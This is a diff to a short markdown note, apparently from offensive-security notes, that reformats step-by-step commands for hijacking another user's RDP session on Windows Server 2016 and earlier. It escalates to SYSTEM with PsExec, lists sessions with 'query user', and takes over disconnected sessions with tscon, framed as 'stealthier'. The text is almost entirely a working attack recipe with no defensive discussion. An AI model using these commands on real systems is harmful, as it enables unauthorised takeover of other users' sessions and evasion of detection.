@@ -2,12 +2,20 @@
 
 ### If you have SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password.
 
-#### 1) cmd.exe (as administrator)
+#### 1) 
 
-#### 2) PsExec64.exe -s cmd.exe
+    cmd.exe (as administrator)
 
-#### 3) query user
+#### 2) 
+
+    PsExec64.exe -s cmd.exe
+
+#### 3) 
+
+    query user
 
 #### 4) Takeover sessions with disc state (stealthier)
 
-#### tscon SESSION_NUM /dest:SESSION_NAME
+#### 
+
+    tscon SESSION_NUM /dest:SESSION_NAME
